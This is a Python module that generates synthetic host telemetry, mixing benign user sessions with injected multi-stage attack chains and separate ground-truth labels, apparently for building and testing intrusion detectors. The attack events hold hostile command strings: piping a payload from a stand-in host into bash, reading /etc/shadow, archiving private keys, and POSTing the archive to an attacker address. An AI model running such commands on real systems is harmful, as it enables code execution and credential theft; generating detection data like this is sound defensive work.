"""Deterministic synthetic provenance telemetry generator.

Generates realistic benign multi-session activity and interleaved multi-stage
attack chains. Raw records never carry attack labels; ground truth is kept
in a separate Truth structure.
"""

from __future__ import annotations

import random
from typing import Any, Optional

from tgap.config import Config, derive_seed
from tgap.schema import Truth


def generate_synthetic_telemetry(
    config: Optional[Config] = None,
    seed: Optional[int] = None,
    split_name: str = "synthetic",
    num_benign: Optional[int] = None,
    num_attacks: Optional[int] = None,
    base_timestamp: float = 1700000000.0,
) -> tuple[list[dict[str, Any]], Truth]:
    """Generate deterministic synthetic telemetry raw records and separate Truth.

    Args:
        config: Configuration object containing generator defaults.
        seed: Base seed. If None, config.base_seed is used.
        split_name: Dataset split label for domain-separated seed derivation.
        num_benign: Number of benign sessions (overrides config).
        num_attacks: Number of multi-stage attack chains to inject (0 for pure benign).
        base_timestamp: Starting Unix epoch timestamp.

    Returns:
        A tuple of (raw_records, truth).
        raw_records contains only observable host event fields (NO labels).
        truth contains the isolated attack chain and stage mappings.
    """
    if config is None:
        config = Config()

    effective_seed = seed if seed is not None else config.base_seed
    rng_seed = derive_seed(effective_seed, "synthetic", split_name)
    rng = random.Random(rng_seed)

    n_benign = num_benign if num_benign is not None else config.synthetic_benign_sessions
    n_attacks = num_attacks if num_attacks is not None else config.synthetic_attacks

    raw_events: list[dict[str, Any]] = []
    # Temporary holder for attack events before assigning sequential IDs: (event_dict, chain_id, stage_name)
    attack_markers: dict[int, tuple[str, str]] = {}  # temp_index -> (chain_id, stage)

    current_pid = 1000

    # 1. Generate Benign Sessions
    # Typical system processes and users
    benign_users = ["alice", "bob", "carol", "svc_web", "system"]
    common_bins = ["/bin/bash", "/usr/bin/python3", "/usr/bin/git", "/usr/bin/vim", "/usr/bin/grep", "/usr/bin/curl"]

    # Global time cursor across sessions
    current_time = base_timestamp

    for session_idx in range(n_benign):
        session_user = rng.choice(benign_users)
        parent_name = "/usr/sbin/sshd" if session_user != "svc_web" else "/usr/sbin/nginx"
        parent_pid = rng.randint(500, 999)

        current_time += rng.uniform(2.0, 15.0)

        # Login / session start
        session_pid = current_pid
        current_pid += 1

        raw_events.append({
            "timestamp": round(current_time, 4),
            "event_type": "process_create",
            "process": "/bin/bash" if session_user != "svc_web" else "/usr/sbin/nginx_worker",
            "pid": session_pid,
            "ppid": parent_pid,
            "user": session_user,
            "target": "/bin/bash",
            "cmdline": f"bash -l (user {session_user})",
        })

        session_events_count = rng.randint(4, 12)
        for _ in range(session_events_count):
            current_time += rng.uniform(0.5, 8.0)
            act_type = rng.choice(["file_io", "exec", "socket", "file_io"])

            if act_type == "file_io":
                target_file = f"/home/{session_user}/proj/file_{rng.randint(1, 10)}.py"
                io_type = rng.choice(["file_read", "file_write"])
                raw_events.append({
                    "timestamp": round(current_time, 4),
                    "event_type": io_type,
                    "process": "/bin/bash",
                    "pid": session_pid,
                    "ppid": parent_pid,
                    "user": session_user,
                    "target": target_file,
                    "cmdline": f"io {target_file}",
                })
            elif act_type == "exec":
                child_bin = rng.choice(common_bins)
                child_pid = current_pid
                current_pid += 1
                raw_events.append({
                    "timestamp": round(current_time, 4),
                    "event_type": "process_create",
                    "process": child_bin,
                    "pid": child_pid,
                    "ppid": session_pid,
                    "user": session_user,
                    "target": child_bin,
                    "cmdline": f"{child_bin} --standard-arg",
                })
                # child terminates soon
                current_time += rng.uniform(0.1, 1.5)
                raw_events.append({
                    "timestamp": round(current_time, 4),
                    "event_type": "process_terminate",
                    "process": child_bin,
                    "pid": child_pid,
                    "ppid": session_pid,
                    "user": session_user,
                    "target": None,
                    "cmdline": f"{child_bin} exit 0",
                })
            elif act_type == "socket":
                raw_events.append({
                    "timestamp": round(current_time, 4),
                    "event_type": "socket_connect",
                    "process": "/bin/bash",
                    "pid": session_pid,
                    "ppid": parent_pid,
                    "user": session_user,
                    "target": f"10.0.0.{rng.randint(10, 50)}:80",
                    "cmdline": "curl http://internal.service/api",
                })

    # 2. Inject Multi-Stage Attack Chains (if num_attacks > 0)
    # Each attack chain has structured stages:
    # 1: recon -> 2: exploit -> 3: priv_esc -> 4: staging -> 5: exfiltration
    if n_attacks > 0 and len(raw_events) > 10:
        total_time_span = current_time - base_timestamp
        time_slot = total_time_span / (n_attacks + 1)

        for attack_idx in range(n_attacks):
            chain_id = f"attack_{attack_idx + 1}"
            chain_start_time = base_timestamp + time_slot * (attack_idx + 1) + rng.uniform(-10.0, 10.0)
            t = chain_start_time

            attacker_ip = f"198.51.100.{rng.randint(20, 200)}"
            mal_user = "svc_web"
            entry_pid = current_pid
            current_pid += 1

            # Stage 1: Reconnaissance (Worker spawn + probing)
            t += rng.uniform(1.2, 2.0)
            recon_ev = {
                "timestamp": round(t, 4),
                "event_type": "process_create",
                "process": "/usr/sbin/nginx",
                "pid": entry_pid,
                "ppid": 1,
                "user": mal_user,
                "target": f"{attacker_ip}:443",
                "cmdline": f"nginx: worker connection from {attacker_ip}",
            }
            raw_events.append(recon_ev)
            attack_markers[len(raw_events) - 1] = (chain_id, "recon")

            t += rng.uniform(1.2, 2.0)
            recon_ev2 = {
                "timestamp": round(t, 4),
                "event_type": "file_read",
                "process": "/usr/sbin/nginx",
                "pid": entry_pid,
                "ppid": 1,
                "user": mal_user,
                "target": "/etc/passwd",
                "cmdline": "cat /etc/passwd",
            }
            raw_events.append(recon_ev2)
            attack_markers[len(raw_events) - 1] = (chain_id, "recon")

            # Stage 2: Exploitation & Payload execution
            t += rng.uniform(1.2, 2.0)
            payload_pid = current_pid
            current_pid += 1
            exploit_ev = {
                "timestamp": round(t, 4),
                "event_type": "process_create",
                "process": "/bin/sh",
                "pid": payload_pid,
                "ppid": entry_pid,
                "user": mal_user,
                "target": "/tmp/.drop_payload",
                "cmdline": "sh -c curl http://malicious.cdn/payload.sh | bash",
            }
            raw_events.append(exploit_ev)
            attack_markers[len(raw_events) - 1] = (chain_id, "exploit")

            t += rng.uniform(1.2, 2.0)
            write_ev = {
                "timestamp": round(t, 4),
                "event_type": "file_write",
                "process": "/bin/sh",
                "pid": payload_pid,
                "ppid": entry_pid,
                "user": mal_user,
                "target": "/tmp/.drop_payload",
                "cmdline": "write /tmp/.drop_payload",
            }
            raw_events.append(write_ev)
            attack_markers[len(raw_events) - 1] = (chain_id, "exploit")

            # Stage 3: Privilege Escalation
            t += rng.uniform(1.2, 2.0)
            root_pid = current_pid
            current_pid += 1
            priv_ev = {
                "timestamp": round(t, 4),
                "event_type": "process_create",
                "process": "/usr/bin/sudo",
                "pid": root_pid,
                "ppid": payload_pid,
                "user": "root",
                "target": "/etc/shadow",
                "cmdline": "sudo -u root /bin/bash -c /tmp/.drop_payload",
            }
            raw_events.append(priv_ev)
            attack_markers[len(raw_events) - 1] = (chain_id, "priv_esc")

            # Stage 4: Staging / Credential Access
            t += rng.uniform(1.2, 2.0)
            stage_ev = {
                "timestamp": round(t, 4),
                "event_type": "file_read",
                "process": "/bin/bash",
                "pid": root_pid,
                "ppid": payload_pid,
                "user": "root",
                "target": "/etc/shadow",
                "cmdline": "cat /etc/shadow",
            }
            raw_events.append(stage_ev)
            attack_markers[len(raw_events) - 1] = (chain_id, "staging")

            t += rng.uniform(1.2, 2.0)
            archive_ev = {
                "timestamp": round(t, 4),
                "event_type": "file_write",
                "process": "/bin/bash",
                "pid": root_pid,
                "ppid": payload_pid,
                "user": "root",
                "target": "/tmp/exfil.tar.gz",
                "cmdline": "tar -czf /tmp/exfil.tar.gz /etc/shadow /etc/ssl/private",
            }
            raw_events.append(archive_ev)
            attack_markers[len(raw_events) - 1] = (chain_id, "staging")

            # Stage 5: Exfiltration
            t += rng.uniform(1.2, 2.0)
            exfil_ev = {
                "timestamp": round(t, 4),
                "event_type": "socket_connect",
                "process": "/bin/bash",
                "pid": root_pid,
                "ppid": payload_pid,
                "user": "root",
                "target": f"{attacker_ip}:4444",
                "cmdline": f"curl -X POST --data-binary @/tmp/exfil.tar.gz http://{attacker_ip}:4444/upload",
            }
            raw_events.append(exfil_ev)
            attack_markers[len(raw_events) - 1] = (chain_id, "exfiltration")

    # 3. Sort all events strictly by timestamp to produce global stream
    # Pair with original index to maintain attack_markers mapping
    indexed_events = list(enumerate(raw_events))
    indexed_events.sort(key=lambda pair: pair[1]["timestamp"])

    final_raw_records: list[dict[str, Any]] = []
    truth_attack_chains: dict[str, list[str]] = {}
    truth_attack_stages: dict[str, str] = {}

    for seq_num, (orig_idx, event_dict) in enumerate(indexed_events, start=1):
        event_id = f"E{seq_num}"

        # Populate final raw record — strictly without ground truth labels
        cleaned_record = dict(event_dict)
        cleaned_record["event_id"] = event_id
        final_raw_records.append(cleaned_record)

        # If this was an attack event, populate Truth separately
        if orig_idx in attack_markers:
            chain_id, stage = attack_markers[orig_idx]
            if chain_id not in truth_attack_chains:
                truth_attack_chains[chain_id] = []
            truth_attack_chains[chain_id].append(event_id)
            truth_attack_stages[event_id] = stage

    truth = Truth(
        attack_chains=truth_attack_chains,
        attack_stages=truth_attack_stages,
        metadata={
            "split": split_name,
            "seed": effective_seed,
            "total_events": len(final_raw_records),
            "num_benign_sessions": n_benign,
            "num_attacks": n_attacks,
        },
    )

    return final_raw_records, truth
